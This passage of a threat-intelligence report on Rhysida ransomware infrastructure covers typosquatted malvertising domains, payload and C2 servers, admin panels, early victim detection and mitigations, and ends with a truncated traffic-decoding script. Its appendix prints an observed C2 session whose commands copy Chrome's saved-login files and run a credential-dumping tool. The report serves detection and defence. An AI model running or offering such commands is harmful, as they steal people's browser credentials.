Future)_**\n\n###### Typosquat-based Malvertising\n\nRhysida threat actors have reportedly [leveraged typosquatted domains for malvertising, aiming to infect](https://www.threatdown.com/blog/rhysida-using-oyster-backdoor-to-deliver-ransomware/)\nvictims with CleanUpLoader prior to deploying ransomware. Specifically, in at least one reported\nincident, CleanUpLoader was [delivered](https://www.rapid7.com/blog/post/2024/06/17/malvertising-campaign-leads-to-execution-of-oyster-backdoor/) after victims visited the fake Microsoft Teams download website\n_micrsoft-teams-download[.]com (see Figure 13). As is typical in malvertising campaigns, the domain is_\nused as a landing page, with the threat actor replicating much of the legitimate brand’s HTML to make it\nappear authentic, enhance its search result ranking, and increase the chance of users clicking on the\ndownload button.\n\n15 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n**_[Figure 13: Fake Microsoft Teams download website using in malvertising campaign (Source: urlscan)](https://urlscan.io/result/28d3375d-c347-4f21-b80c-f9ffcacce4e7/)_**\n\nDrawing on industry reports about impersonated software products linked to CleanUpLoader, distinct\nredirects to a known payload server, and other technical indicators, Insikt Group identified additional\ndomains and associated websites that are highly likely to have been, or will be, used by this threat actor\nfor malvertising (see Table 4). Notably, all identified websites contained specific code indicative of the\nthreat actor’s distinct tradecraft. Additionally, it is notable that most domains began resolving around the\nsame time.\n\n**Domain** **IP Address** **Registrar** **First Seen** **Software Product**\n\nmicrsoft-teams-download[.]com Cloudflare PDR Ltd. 2024-07-19 Microsoft Teams\n\nnnlcrosaftteams-download[.]pro Cloudflare PDR Ltd. 2024-06-18 Microsoft Teams\n\nmicrosoftt-teams-download[.]com Cloudflare PDR Ltd. 2024-05-30 Microsoft Teams\n\n16 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n|Domain|IP Address|Registrar|First Seen|Software Product|\n|---|---|---|---|---|\n|micrsoft-teams-download[.]com|Cloudflare|PDR Ltd.|2024-07-19|Microsoft Teams|\n|nnlcrosaftteams-download[.]pro|Cloudflare|PDR Ltd.|2024-06-18|Microsoft Teams|\n|microsoftt-teams-download[.]com|Cloudflare|PDR Ltd.|2024-05-30|Microsoft Teams|\n\n\n-----\n\n|microssoft-teams[.]com|Cloudflare|PDR Ltd.|2024-05-20|Microsoft Teams|\n|---|---|---|---|---|\n|microsoftt-teams[.]com|45.61.136[.]244|PDR Ltd.|2024-05-19|Microsoft Teams|\n|ns-client[.]net|162.33.178[.]137|Namecheap|2024-05-16|NC Client|\n|auttodessk[.]com|45.61.136[.]48|Namecheap|2024-05-16|AutoDesk|\n|aut0deskk[.]com|67.217.228[.]11|Namecheap|2024-05-15|AutoDesk|\n|autosdesk[.]net|67.217.228[.]136|Namecheap|2024-05-09|AutoDesk|\n|zoom-video[.]org|64.95.13[.]77|Namecheap|2024-05-17|Zoom|\n|crystal-maker[.]com|45.61.136[.]85|Namecheap|2024-05-16|Crystal Maker|\n|crystalmaker[.]pro|67.217.228[.]171|Namecheap|2024-05-10|Crystal Maker|\n|webex-up[.]com|162.33.179[.]46|Namecheap|2024-05-09|Webex|\n\n\n**_Table 4: Suspected malvertising domains used to lure victims into downloading fake software (Source: Recorded Future)_**\n\nInsikt Group has identified corresponding CleanUpLoader samples for the software products Microsoft\nTeams, NC Client, AutoDesk, Zoom, CrystalMaker, and Webex.\n\nTwo domains stand out because despite not referencing software products like Microsoft Teams in their\ndomain names, they still hosted websites impersonating download sites for these software products\n(see Table 5). Both domains resolved to IP addresses within BLNWX, an ASN (AS399629) frequently\nused by the threat actor. Up until at least May 8, 2024, pixalate[.]us directly [hosted a fake Microsoft](https://urlscan.io/result/861f9362-0b00-4109-800c-18ec8c1101d4/)\n[Teams download website and, starting no later than May 10, 2024, began redirecting to autosdesk[.]net.](https://urlscan.io/result/15830dc4-c982-4627-86c5-1809d5a648f3/)\n\n**Domain** **IP Address** **Registrar** **First Seen** **Software Product**\n\ngang-force[.]com 162.33.179[.]222 PDR Ltd. 2024-05-20 Microsoft Teams\n\npixalate[.]us 64.95.13[.]98 Namecheap 2024-05-08 AutoDesk\n\n**_Table 5: Domains possibly used for testing purposes (Source: Recorded Future)_**\n\nAlthough Onion Mail addresses are commonly used by cybercriminals, including Rhysida, for victim\ncommunication, it is notable that both domains are linked to such email addresses. Specifically,\n_gang-force[.]com has its SOA record set to estelaosinski@onionmail[.]org, while pixalate[.]us lists_\n_kimigleason@onionmail[.]org as the registrant email address._\n\n###### Payload Server(s)\n\nAfter the victim clicks the download button on the fake download website, they are redirected to a\n[domain that hosts the malicious fake software product, tracked as the payload server. One publicly](https://www.rapid7.com/blog/post/2024/06/17/malvertising-campaign-leads-to-execution-of-oyster-backdoor/)\n[reported](https://www.rapid7.com/blog/post/2024/06/17/malvertising-campaign-leads-to-execution-of-oyster-backdoor/) payload server for CleanUpLoader was 206.71.149[.]46, with the associated domain\n_prodfindfeatures[.]com. This domain was registered through Namecheap and hosted on the IP address_\n\n17 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n|Domain|IP Address|Registrar|First Seen|Software Product|\n|---|---|---|---|---|\n|gang-force[.]com|162.33.179[.]222|PDR Ltd.|2024-05-20|Microsoft Teams|\n|pixalate[.]us|64.95.13[.]98|Namecheap|2024-05-08|AutoDesk|\n\n\n-----\n\nfrom April 6 to June 7, 2024. The server was used to deliver CleanUpLoader through fake downloads\nfor at least three software products (see Table 6).\n\n**Filename** **Impersonated Software Product** **First Seen**\n\n`NSCP-0.5.2.41-x64.exe` NC Client [2024-05-10](https://urlscan.io/result/414dbb57-529c-4886-b9aa-d5b740804c3e/)\n\n`FusionClientDownloader.exe` Autodesk [2024-05-15](https://urlscan.io/result/05b0e231-1e21-4915-8487-de8a72900236/)\n\n`MSTeamsSetup_c_l_.exe` Microsoft Teams [2024-05-20](https://urlscan.io/result/1945ba33-f21b-4731-88c0-8bba6f5641ba/)\n\n**_Table 6: Fake download files (Source: Recorded Future)_**\n\nAdditionally, Insikt Group observed that the typosquatting domain nnlcrosaftteams-download[.]pro\nredirected to backuppingplanseasy[.]com, registered via Enom and hosted on 216.245.184[.]129\nbetween June 14 and August 22, 2024. The domain ultimately led to the download of NetSupport,\nwhich will be explored in the following section. While in use, both the payload server delivering\nCleanUpLoader and the likely associated server hosting NetSupport had three open ports, each with\ndistinct configurations.\n\nBased on these server configurations, we identified four other domains that are likely connected.\nNotably, all four domains were hosted on IP addresses associated with BLNX, registered through Enom,\nand follow a similar domain naming convention, comprising English words arranged to form a sort of\nsentence (see Table 7).\n\n**Domain** **IP Address** **Registrar** **First Seen** **Last Seen**\n\nbuydotclearlynet[.]com 64.94.84[.]61 Enom 2024-07-02 2024-09-08\n\ndocsfromthewest[.]com 149.248.78[.]182 Enom 2024-07-02 2024-09-01\n\nheartwithinadream[.]com 162.33.178[.]83 Enom 2024-07-02 2024-08-29\n\nitisthebestforyou[.]eu 193.149.190[.]10 Enom 2024-06-14 2024-08-17\n\n**_Table 7: Suspected additional payload servers by Rhysida threat actors (Source: Recorded Future)_**\n\n**NetSupport**\n\nAs previously noted, Insikt Group observed that the typosquatting domain\n_nnlcrosaftteams-download[.]pro redirected to backuppingplanseasy[.]com, which ultimately led to the_\ndownload of NetSupport. Although NetSupport has not been publicly linked to Rhysida, the server's\nmatching configurations, the use of a fake Microsoft Teams download for payload delivery, and the\nsimilar domain naming pattern suggest that NetSupport is likely employed in at least some of Rhysida's\noperations. Based on open-source data, the server was only observed being used to deliver\nNetSupport through fake downloads for Microsoft Teams (see Table 8).\n\n18 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n|Filename|Impersonated Software Product|First Seen|\n|---|---|---|\n|NSCP-0.5.2.41-x64.exe|NC Client|2024-05-10|\n|FusionClientDownloader.exe|Autodesk|2024-05-15|\n|MSTeamsSetup_c_l_.exe|Microsoft Teams|2024-05-20|\n\n|Domain|IP Address|Registrar|First Seen|Last Seen|\n|---|---|---|---|---|\n|buydotclearlynet[.]com|64.94.84[.]61|Enom|2024-07-02|2024-09-08|\n|docsfromthewest[.]com|149.248.78[.]182|Enom|2024-07-02|2024-09-01|\n|heartwithinadream[.]com|162.33.178[.]83|Enom|2024-07-02|2024-08-29|\n|itisthebestforyou[.]eu|193.149.190[.]10|Enom|2024-06-14|2024-08-17|\n\n\n-----\n\n|Filename|Impersonated Software Product|First Seen|\n|---|---|---|\n|Teams.exe|Microsoft Teams|2024-06-24|\n|setup_mst.exe|Microsoft Teams|2024-06-20|\n\n\n**_Table 8: NetSupport RAT disguised as Microsoft Teams (Source: Recorded Future)_**\n\n###### CleanUpLoader C2 Servers\n\nAfter infection, CleanUpLoader connects to its C2 server(s) on port 443. CleanUpLoader C2 servers\nthat we analyzed for this report typically featured distinct configurations on port 443 and, regardless of\nthe queried endpoint, consistently returned the same HTML response that has not been observed\nelsewhere.\n\nBased on server-distinct configurations and the HTML response, Insikt Group identified several\nadditional CleanUpLoader C2 domains and their associated IP addresses (see Table 9). The C2 servers\nInsikt Group observed were generally reused across multiple samples and over extended periods,\nrather than being deployed for single-use operations.\n\n**Domain** **IP Address** **Registrar** **First Seen** **Last Seen** **Group**\n\nfirscountryours[.]eu 162.19.237[.]181 Enom 2024-06-24 2024-09-11 1\n\ncodeforprofessionalusers[.]com 51.195.232[.]46 Enom 2024-05-11 2024-09-12 1\n\npostmastersoriginals[.]com 139.99.221[.]140 Enom 2024-05-22 2024-09-13 1\n\nretdirectyourman[.]eu 206.166.251[.]114 Namecheap 2024-03-24 2024-09-13 2\n\nsupfoundrysettlers[.]us 64.95.10[.]243 Namecheap 2024-03-24 2024-09-13 2\n\nwhereverhomebe[.]com 149.248.79[.]62 Enom 2024-05-20 2024-09-13 2\n\nyourserenahelpcustom[.]uk 149.248.79[.]62 Namecheap 2024-03-24 2024-04-25 3\n\nconnectivity-check[.]linkpc[.]net 45.66.248[.]78 DNSExit.com 2023-10-04 2024-06-27 4\n\ntime-check-broker[.]com 91.240.118[.]215 Namecheap 2023-11-13 2024-09-12 5\n\n**_Table 9: CleanUpLoader C2 servers (Source: Recorded Future)_**\n\nThrough our hunting efforts, we identified samples that connected to either two to three C2 domains or\njust a single C2 domain. For example, we identified multiple samples that each connected to two to\nthree of the domains firscountryours[.]eu, codeforprofessionalusers[.]com, and\n_postmastersoriginals[.]com, as well as multiple samples that connected to two to three of the domains_\n_retdirectyourman[.]eu, supfoundrysettlers[.]us, and whereverhomebe[.]com. We used this observation_\nto define sample groups, as indicated in the rightmost column of Table 9. These sample groups were\nlater used as the basis to create Activity Clusters, which we explore further in the Activity Clusters\nsection.\n\n19 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n|Domain|IP Address|Registrar|First Seen|Last Seen|Group|\n|---|---|---|---|---|---|\n|firscountryours[.]eu|162.19.237[.]181|Enom|2024-06-24|2024-09-11|1|\n|codeforprofessionalusers[.]com|51.195.232[.]46|Enom|2024-05-11|2024-09-12|1|\n|postmastersoriginals[.]com|139.99.221[.]140|Enom|2024-05-22|2024-09-13|1|\n|retdirectyourman[.]eu|206.166.251[.]114|Namecheap|2024-03-24|2024-09-13|2|\n|supfoundrysettlers[.]us|64.95.10[.]243|Namecheap|2024-03-24|2024-09-13|2|\n|whereverhomebe[.]com|149.248.79[.]62|Enom|2024-05-20|2024-09-13|2|\n|yourserenahelpcustom[.]uk|149.248.79[.]62|Namecheap|2024-03-24|2024-04-25|3|\n|connectivity-check[.]linkpc[.]net|45.66.248[.]78|DNSExit.com|2023-10-04|2024-06-27|4|\n|time-check-broker[.]com|91.240.118[.]215|Namecheap|2023-11-13|2024-09-12|5|\n\n\n-----\n\nOf note, two domains, yourserenahelpcustom[.]uk and whereverhomebe[.]com, were hosted on the\nsame IP address consecutively, indicating they likely belong to the same threat actor. Also noteworthy is\nthat one of the domains, supfoundrysettlers[.]us, is associated with an Onion Mail email address,\n_siskollew@onionmail[.]org, used during its registration._\n\n###### Admin Panel\n\nCleanUpLoader C2 servers associated with Rhysida activity typically connect to an admin panel via port\n80. This admin panel is a simple website where Rhysida threat actors log in using a username and\npassword on the endpoint /login on TCP port 443 (see Figure 14). The admin panel is generally linked\nto a specific domain, with the most recent version associated with metalforthecoredream[.]com, which\nresolved to 141.255.166[.]66 from April 10 to August 21, 2024. The same IP address hosted a likely older\nversion of the panel, linked to the domain lakeshorehomebuilders[.]com, from March 3 to March 20,\n2024. One difference in the panel was the use of “Loader” instead of “Login” in the HTML title, as\nseen in the current version.\n\n**_Figure 14: Rhysida panel used to administer CleanUpLoader C2 servers (Source:_** _[URLScan)](https://urlscan.io/result/2543b15a-ee53-4f0f-9ed5-5a63cb855cc9/)_\n\nGiven that the initially identified panel used the Laravel Livewire framework, along with distinctive HTML\nfeatures like keyword usage and imported JavaScript files, we identified several additional\nCleanUpLoader panels. These, along with the previously mentioned panels, are listed in Table 10.\n\n20 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n|Domain|IP Address|Registrar|First Seen|Last Seen|\n|---|---|---|---|---|\n|metalforthecoredream[.]com|141.255.166[.]66|Namecheap|2024-04-10|2024-08-30|\n|lakeshorehomebuilders[.]com|141.255.166[.]66|dnsowl.com|2024-03-03|2024-03-20|\n|basiconlineincome[.]com|213.109.202[.]161|namehero.com|2024-01-24|2024-08-01|\n|time-check-broker[.]com|91.240.118[.]215|registrar-servers.com|2023-11-13|2024-09-12|\n|connectivity-check.linkpc[.]net|45.66.248[.]78|DNSExit.com|2023-10-04|2024-06-27|\n\n\n**_Table 10: Panel domains connected to CleanUploader activity (Source: Recorded Future)_**\n\nOf note, all panels except the current one used by Rhysida have “Loader” as their HTML title instead of\n“Login”. Moreover, time-check-broker[.]com and connectivity-check.linkpc[.]net serve a dual purpose,\nfunctioning as both panels and CleanUpLoader C2 servers. This dual functionality will be examined\nfurther in the Activity Clusters section.\n\n###### Zabbix Monitoring Server\n\nThrough Recorded Future Network Intelligence data, we identified a Zabbix server that connects to the\npanel on TCP port 10050 and is used for infrastructure monitoring. Notably, the Zabbix panel's\nlanguage is set to Russian (see Figure 15).\n\n**_[Figure 15: Zabbix panel used for infrastructure monitoring (Source: URLScan)](https://urlscan.io/result/51ab994a-21c3-4e2e-a0ae-a386d9ebfccf/)_**\n\n21 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n##### Activity Clusters\n\nWe identified three distinct activity clusters (see Figure 16). The clustering analysis was based on\nvarious factors, including the sample groups discussed in the CleanUpLoader C2 Servers section\n(based on the number and types of C2 domains they connected to), links to Rhysida activity, domain\nnaming patterns, the timing of the activity, and the use of dual-purpose infrastructure for both panel\nand C2 functions.\n\n**_Figure 16: Three CleanUpLoader clusters observed in 2023 and 2024 (Source: Recorded Future)_**\n\nActivity Cluster 1 began in 2024 and comprises samples from group 1, all of which connect to two to\nthree of the domains firscountryours[.]eu, codeforprofessionalusers[.]com, and\n_postmastersoriginals[.]com. Activity Cluster 2, also starting in 2024, is the only cluster associated with_\nRhysida activity and includes samples from group 2. The C2 servers alongside their sample group are\nlisted in Table 9 in the CleanUpLoader C2 Servers section. Activity Cluster 2 also encompasses sample\ngroup 3, as the domain yourserenahelpcustom[.]uk was hosted on the same IP address that later\nhosted whereverhomebe[.]com. Furthermore, yourserenahelpcustom[.]uk was registered on the same\nday as retdirectyourman[.]eu and supfoundrysettlers[.]us through the same registrar.\n\nActivity Cluster 3 began emerging in 2023 and includes samples from groups 4 and 5, specifically\nthose connecting to either connectivity-check[.]linkpc[.]net or time-check-broker[.]com. Most\nimportantly, both domains served dual purposes, being used for both C2 and panel, which had not been\nobserved with other C2 servers. In addition, although connectivity-check[.]linkpc[.]net is a dynamic\nDNS domain, both domains feature the term “check” and use dashes between the words.\n\nActivity Clusters 1 and 2 exhibit significant indications of being associated with the same threat actor.\nSamples from both clusters connect to two to three domains, a pattern not observed in other samples.\n\n22 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\nThe activity began around the same time in 2024, and the domains follow a similar naming convention,\nfeaturing English words arranged to form sentences. Additionally, domains from both clusters were at\nleast partially registered through Enom and include at least one domain with a .eu top-level domain\n(TLD).\n\n##### Rhysida Extortion Site\n\nRhysida operates an extortion site where it displays its victims along with a countdown clock indicating\nwhen stolen data will be leaked as part of its double extortion tactic (see Figure 17). Victims are\ndirected to the extortion site with a provided key to initiate negotiations. Typically, this site is hosted on\nan Onion site, accessible only through Tor. However, a likely security lapse by Rhysida threat actors in\nJune 2023 [exposed the website's actual IP address, 5.255.106[.]234 on TCP port 57381.](https://x.com/CanaryDarkweb/status/1670321393203027968)\n\n**_Figure 17: Exposed Rhysida extortion site as of June 6, 2023 (Source:_** _[urlscan)](https://urlscan.io/result/48292549-29d5-42d6-8455-dcb8f385c2fd/)_\n\n23 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\nIn response, Rhysida not only addressed the security issue but also [appears to have switched its web](https://urlscan.io/search/#page.title.keyword%3A%22Rhysida%22)\nserver from Apache to Nginx. The new extortion site features some minor changes, such as a display of\nthe number of victim organizations Rhysida has and the number of auctions currently online (see Figure\n**18).**\n\n**_[Figure 18: Rhysida extortion site based on an onion site as of September 4, 2024 (Source: urlscan)](https://pro.urlscan.io/result/7d4a4d4c-3bb6-4a75-8828-b338adeffdd8)_**\n\n24 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n### Early Detection of Rhysida Ransomware Victims\n\nThere is typically a period known as dwell time between gaining initial access to a victim's network and\ndeploying ransomware. During this time, the threat actor performs additional internal reconnaissance,\nmoves laterally, establishes persistence, and exfiltrates data for double extortion. This period provides\nnetwork defenders with opportunities to detect malicious activity before ransomware deployment, such\nas by monitoring network traffic.\n\nUsing Recorded Future Network Intelligence, we identified Rhysida ransomware victims an average of\n30 days before these organizations were listed on the Rhysida extortion site and before the ransomware\nhad been deployed.\n\n##### Communication Between Named Rhysida Victims and CleanUpLoader C2s\n\nOf the eleven victims listed by Rhysida on its extortion site in July 2024, seven — over 60% — showed\nearly signs of infection through beaconing to CleanUpLoader C2 servers. On average, more than 30\ndays elapsed between the first beaconing from these victim organizations to CleanUpLoader C2\nservers and the day they appeared on the extortion site (see Figure 19).\n\n**_Figure 19: Communication between named Rhysida victims and CleanUpLoader C2s (Source: Recorded Future)_**\n\nAlthough the exact reasons are unclear, the variation between organizations can likely be attributed to\ndifferences in their infrastructure, including factors such as size, complexity, and security maturity.\nOther possible explanations could include the volume of victim data stolen and the time required for the\nthreat actors to review the exfiltrated data.\n\n25 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n##### Ongoing Communication from Potential Victims Not Yet Publicly Named\n\nIn addition to observing network traffic between known Rhysida victims and CleanUpLoader C2 servers\nlinked to Rhysida operations, Insikt Group has detected traffic from a wide range of organizations to\nthese servers (see Figure 20). This indicates that these organizations might appear on the extortion site\nonce the operation concludes and ransomware is deployed. However, it could also mean the\nransomware operation might be abandoned by the threat actors due to feasibility issues or that the\nvictim organizations have successfully mitigated the intrusion. While the outcome is unclear at this\nstage, Insikt Group continues to monitor the activity.\n\n**_Figure 20: Communication between named potential Rhysida victims and CleanUpLoader C2s (Source: Recorded Future)_**\n\nLike known Rhysida victims, most of the suspected CleanUpLoader victims not yet listed on the\nextortion site are private sector organizations based in the US. However, Insikt Group has also identified\npotential victims in other countries, including the United Kingdom (see Figure 21).\n\n26 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n**Figure 21: Breakdown of potential Rhysida victims by sector (left) and country (right) (Source: Recorded Future)**\n\n##### Applicability as Early Detection for Ransomware in General\n\nSince this ransomware detection method is unique and not widely adopted, there are few comparable\nmetrics. However, a recent analysis by Insikt Group found that BianLian victims were identified between\n7 and 30 days before being listed on the extortion blog, with an average early detection of 17 days.\nDespite the limited sample size, this aligns roughly with the observations for Rhysida and the wider\ndwell time as [reported by the cybersecurity industry.](https://cloud.google.com/security/resources/m-trends)\n\nThis early detection method can in theory be applied to any ransomware group and its victims, provided\nits infrastructure can be detected and then combined with Recorded Future Network Intelligence.\nAchieving this depends on two key factors: timeliness and the breadth of detected malicious\ninfrastructure. Since ransomware groups frequently use a mix of commercially available and custom\ntools, and continuously switch and evolve them, it is essential to swiftly identify the range of these tools\nby monitoring the threat landscape and developing and maintaining effective detections. Additionally,\ntimeliness is crucial, and our insights into higher-tier infrastructure are vital as they enable us to quickly\ndetect and identify emerging infrastructure, complementing traditional hunting methods.\n\n27 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n### Mitigations\n\nIn addition to standard security best practices, the following mitigations are recommended:\n\n  - **User Training and Awareness: Train employees to recognize phishing emails, suspicious links,**\nand other common ransomware delivery methods. Incorporate the latest lure schemes and\nattack trends (such as SEO poisoning) into training to keep awareness current. Regular training\ncan significantly reduce the risk of user actions leading to a ransomware infection (for example,\ntraining employees to verify that downloads are from legitimate sources).\n\n  - **Threat Landscape Monitoring: Monitor the threat landscape to understand the tools and tactics**\nused by ransomware groups. This insight helps in setting up effective security controls and\ninforms strategic decisions to better protect your organization.\n\n  - **Minimize Data Storage: Reduce the amount of sensitive data stored to limit potential exposure in**\ncase of a breach, particularly in scenarios involving double extortion attacks where attackers\nmight threaten to leak stolen data.\n\n  - **Access Controls and the Principle of Least Privilege: Implement strong access controls and**\nfollow the principle of least privilege, ensuring users only have the permissions necessary to\nperform their tasks. Limiting administrative rights can prevent ransomware from spreading\nacross systems and causing extensive damage.\n\n  - **Advanced Threat Detection: Recorded Future clients can apply YARA and Sigma rules along**\nwith the extensive and continually updated rules available in the Recorded Future Intelligence\nCloud, for custom file scanning and detection across various logging systems to effectively\nidentify and respond to unwanted tools and suspicious activity.\n\n  - **[Leverage Network Intelligence: Use Recorded Future Network Intelligence](https://www.recordedfuture.com/)** to detect exfiltration\nevents early, which can help prevent ransomware deployment before it escalates. This approach\nrelies on comprehensive, proactive infrastructure discovery provided by Insikt Group and the\nanalysis of vast amounts of network traffic.\n\n  - **Monitoring for Leaked Data: Implement data breach monitoring solutions that actively check for**\nstolen credentials (such as by using the [Recorded Future Identity Intelligence Module) and other](https://www.recordedfuture.com/products/identity-intelligence)\nleaked information across dark web forums and breach databases (such as by using the\n[Recorded Future Threat Intelligence Module).](https://www.recordedfuture.com/products/threat-intelligence)\n\n  - **Regular Backups: Maintain up-to-date backups of all critical data and ensure they are stored**\noffline or in a secure, cloud-based solution. Regularly test these backups to confirm they can be\nrestored quickly and completely in the event of an attack.\n\n  - **Patch Management: Ensure all software, operating systems, and applications are kept up to date**\nwith the latest security patches. To effectively manage vulnerabilities, leverage vulnerability\n[intelligence (such as the Recorded Future Vulnerability Intelligence Module) to prioritize patching](https://www.recordedfuture.com/products/vulnerability-intelligence)\ndecisions, as outdated software can be a common entry point for ransomware and other threats,\nincluding privilege escalation.\n\n28 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n### Outlook\n\nIn this report, Insikt Group outlined Rhysida’s multi-tiered infrastructure, including typo-squatted\ndomains for SEO poisoning, payload servers, CleanUpLoader C2 infrastructure for post-exploitation,\nand higher-tier components. By leveraging Recorded Future Network Intelligence, Insikt Group\nidentified Rhysida ransomware victims an average of 30 days before their appearance on extortion\nsites, providing a crucial opportunity to prevent deployment and mitigate damage. While this is a\nspecific instance, it is part of a larger initiative for early ransomware detection using Recorded Future\nNetwork Intelligence, which has the potential to be applied to any ransomware group and its victims,\nassuming its infrastructure can be detected, as shown in other cases.\n\nWith ransomware anticipated to remain a major security threat across all industries, company sizes, and\ngeographies, robust prevention and early detection mechanisms are more crucial than ever. The threat\nis further intensified by the rapid advancement of tools and techniques by existing ransomware groups,\nthe frequent emergence of new groups with unique methods, the increasing professionalization of the\ncybercriminal underground, and the convergence of state-sponsored and financially motivated\nactivities driven by geopolitical factors. By continuously monitoring ransomware groups, their methods,\nand their infrastructure, Insikt Group aims to stay ahead of emerging threats and successfully counter\nransomware.\n\n29 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n### Appendix A: CleanUpLoader HTTP Response and Request Decode Script\n```\n import pyshark\n import sys\n def decode_data(encoded_data):\n  char_map = \"00 80 40 C0 20 A0 60 E0 10 90 50 D0 30 B0 70 F0 08 88 48 C8 28 A8 68 E8 18 98 58 D8\n 38 B8 78 F8 04 84 44 C4 24 A4 64 E4 14 94 54 D4 34 B4 74 F4 0C 8C 4C CC 2C AC 6C EC 1C 9C 5C DC 3C\n BC 7C FC 02 82 42 C2 22 A2 62 E2 12 92 52 D2 32 B2 72 F2 0A 8A 4A CA 2A AA 6A EA 1A 9A 5A DA 3A BA\n 7A FA 06 86 46 C6 26 A6 66 E6 16 96 56 D6 36 B6 76 F6 0E 8E 4E CE 2E AE 6E EE 1E 9E 5E DE 3E BE 7E\n FE 01 81 41 C1 21 A1 61 E1 11 91 51 D1 31 B1 71 F1 09 89 49 C9 29 A9 69 E9 19 99 59 D9 39 B9 79 F9\n 05 85 45 C5 25 A5 65 E5 15 95 55 D5 35 B5 75 F5 0D 8D 4D CD 2D AD 6D ED 1D 9D 5D DD 3D BD 7D FD 03\n 83 43 C3 23 A3 63 E3 13 93 53 D3 33 B3 73 F3 0B 8B 4B CB 2B AB 6B EB 1B 9B 5B DB 3B BB 7B FB 07 87\n 47 C7 27 A7 67 E7 17 97 57 D7 37 B7 77 F7 0F 8F 4F CF 2F AF 6F EF 1F 9F 5F DF 3F BF 7F FF A8 5D 33\n 10 30 D0 04 10\"\n  decoded = []\n  character_maps = char_map.split(\" \")\n  index_of_useless_data = None\n  length_of_data = len(encoded_data)\n  # if the encoded data is odd, find index_of_useless_data\n  # if length_of_data % 2 != 0:\n  index_of_useless_data = length_of_data // 2\n  for index, item in enumerate(reversed(encoded_data)):\n     if index == index_of_useless_data:\n       found_item = item\n     else:\n       decimal_converted = item\n       found_item = character_maps[decimal_converted]\n       decoded.append(found_item)\n  decoded_str = \"\".join(decoded)\n  bytes_object = bytes.fromhex(decoded_str)\n  # Decode bytes to ASCII string\n  ascii_string = bytes_object.decode(\"ascii\")\n  return ascii_string\n def parse_http_packets(pcap_file):\n  try:\n     capture = pyshark.FileCapture(pcap_file, display_filter='http') # Filter only HTTP traffic\n  except FileNotFoundError:\n     print(f\"Error: File '{pcap_file}' not found.\")\n     sys.exit(1)\n  for i, packet in enumerate(capture):\n     packet.http.raw_mode = True\n     # Check if the packet contains HTTP request or response\n     try:\n       if 'HTTP' in packet:\n\n```\n30 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n31 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n### Appendix B: CleanUpLoader C2 Communications\n\n**C2 Server Request** **Client Response**\n```\nCommand ID 11981 Type 1\nCommand %SysteRoot%\\\\sysnative\\\\cmd.exe\n                               Command ID 11981 ID\n                               Session ID 2005\n                               Result\n                                      reserved.\n                                      C:\\Users\\Admin\\AppData\\Local\\Te\nCommand ID 11982 Type 1\nCommand cd %localappdata%\\\\Temp\n                               Command ID 11982 ID\n                               Session ID 2005\n                               Result cd %local<truncated>\nCommand ID 11983 Function <Blank>\nExecute false Format exe\nCommand chrgetpdsi.exe\n\n```\n32 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n|C2 Server Request|Col2|Col3|Col4|Client Response|Col6|Col7|Col8|\n|---|---|---|---|---|---|---|---|\n|Command ID|11981|Type|1|||||\n|Command|%SysteRoot%\\\\sysnative\\\\cmd.exe|||||||\n|||||Command ID|11981|ID|2995|\n|||||Session ID|2005|Status|4|\n|||||Result|Microsoft Windows [Version 10.0.22000.493] (c) Microsoft Corporation. All rights reserved. C:\\Users\\Admin\\AppData\\Local\\Te<truncated>|||\n|Command ID|11982|Type|1|||||\n|Command|cd %localappdata%\\\\Temp|||||||\n|||||Command ID|11982|ID|2995|\n|||||Session ID|2005|Status|4|\n|||||Result|cd %local<truncated>|||\n|Command ID|11983|Function|<Blank>|||||\n|Execute|false|Format|exe|||||\n|Command|chrgetpdsi.exe|||||||\n\n\n-----\n\n|file|TVqQAAMAAAAEAAAA\\/\\/8AALgAAAAAAAAAQA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAgAAAAA4<truncated>|Col3|Col4|Col5|Col6|Col7|Col8|\n|---|---|---|---|---|---|---|---|\n|||||Command ID|11983|ID|2995|\n|||||Session ID|2005|Status|4|\n|||||Result|OK|||\n|Command ID|11984|Type|1|||||\n|Command|copy \\\"%localappdata%\\\\Google\\\\Chrome\\\\Us er Data\\\\Local State\\\" \\\"%localappdata%\\\\Temp\\\\Local State\\\" & copy \\\"%localappdata%\\\\Google\\\\Chrome\\\\Us er Data\\\\efault\\\\Login Data\\\" \\\"%localappdata%\\\\Temp\\\\Login Data\\\" & chrgetpdsi.exe 1 & del \\/f \\\"Local State\\\" & del \\/f \\\"Login Data\\\" & type chrgetpdsi.txt & del \\/f chrgetpdsi.txt|||||||\n|||||Command ID|11984|ID|2995|\n|||||Session ID|2005|Status|4|\n|||||Result|copy \"%localappdata%\\Google\\Chrome\\User Data\\Local State\" \"%localappdata%\\Temp\\Local State\" & copy 